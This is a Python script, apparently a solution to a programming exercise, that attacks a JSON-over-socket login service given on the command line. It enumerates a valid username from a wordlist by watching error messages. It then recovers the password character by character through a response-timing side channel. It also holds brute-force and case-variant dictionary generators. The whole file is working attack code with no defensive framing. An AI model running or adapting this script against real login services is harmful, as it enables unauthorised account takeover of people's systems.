import argparse
import itertools
import json
import os
import socket
import string
import time


class Hack:
    def __init__(self, ip_address, port, generator):
        self.ip_address = ip_address
        self.port = port
        self.generator = generator

    def find_password(self):
        with socket.socket() as admin_socket:
            address = (self.ip_address, self.port)
            admin_socket.connect(address)
            # find login
            admin_login = ""
            login_gen = self.generator.typical_login_gen()
            for login in login_gen:
                data = dict(login=login, password="")
                data = json.dumps(data)
                admin_socket.sendall(bytes(data, encoding="utf-8"))
                response = admin_socket.recv(1024).decode()
                response_dict = json.loads(response)
                if response_dict['result'] == "Wrong password!":
                    admin_login = login
                    break
            # find password
            start = ''
            while True:
                pw_gen = self.generator.password_letter_generator(start)
                for password in pw_gen:
                    start_time = time.perf_counter()
                    data = dict(login=admin_login, password=password)
                    data = json.dumps(data)
                    admin_socket.sendall(bytes(data, encoding="utf-8"))
                    response = admin_socket.recv(1024).decode()
                    response_dict = json.loads(response)
                    end_time = time.perf_counter()
                    total_time = end_time - start_time
                    if total_time >= 0.1:
                        start = password
                        break
                    if response_dict['result'] == "Connection success!":
                        break
                if response_dict['result'] == "Connection success!":
                    print(data)
                    break


class Generator:

    def __init__(self, typical_password_path: str, typical_login_path: str) -> None:
        self.typical_password_path = typical_password_path
        self.typical_login_path = typical_login_path

    def password_force_generator(self):
        character_set = string.ascii_lowercase + string.digits
        for length in range(1, len(character_set) + 1):
            for product in itertools.product(character_set, repeat=length):
                yield ''.join(product)

    def password_letter_generator(self, start: str) -> str:
        character_set = string.ascii_letters + string.digits
        for letter in character_set:
            yield start + letter

    def typical_password_gen(self):
        typical_password_database = self.read_file(self.typical_password_path)
        for password in typical_password_database:
            password = [(i, i.upper()) for i in password.lower()]
            temp = ''
            for word in itertools.product(*password):
                password = ''.join(word)
                if password == temp:
                    continue
                yield password
                temp = password

    def typical_login_gen(self):
        typical_login_database = self.read_file(self.typical_login_path)
        for login in typical_login_database:
            yield login

    def read_file(self, password_file_name: str):
        with open(password_file_name, 'r', encoding="utf-8") as file:
            data = file.read().splitlines()
        return data


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', help='enter hostname')
    parser.add_argument('port', help='enter port number', type=int)
    args = parser.parse_args()

    typical_password_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt")
    typical_login_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt")
    my_generator = Generator(typical_password_path, typical_login_path)

    hacker_args = (args.host, args.port, my_generator)

    my_hacker = Hack(*hacker_args)
    my_hacker.find_password()


if __name__ == "__main__":
    main()
